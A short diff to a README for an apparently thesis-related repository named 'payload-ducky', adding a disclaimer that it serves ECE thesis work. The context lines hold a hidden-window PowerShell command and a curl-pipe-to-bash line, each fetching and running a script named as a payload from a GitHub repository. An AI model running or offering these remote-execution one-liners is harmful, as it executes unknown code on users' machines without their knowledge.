@@ -14,3 +14,5 @@ powershell -w hidden -c "iwr 'https://raw.githubusercontent.com/sazid570/payload
 ```
 curl -fsSL https://raw.githubusercontent.com/sazid570/payload-ducky/refs/heads/main/linux.sh | bash
 ```
+
+### This repo is to serve the purpose of the thesis work in ECE, not to spread harmful codes to others.
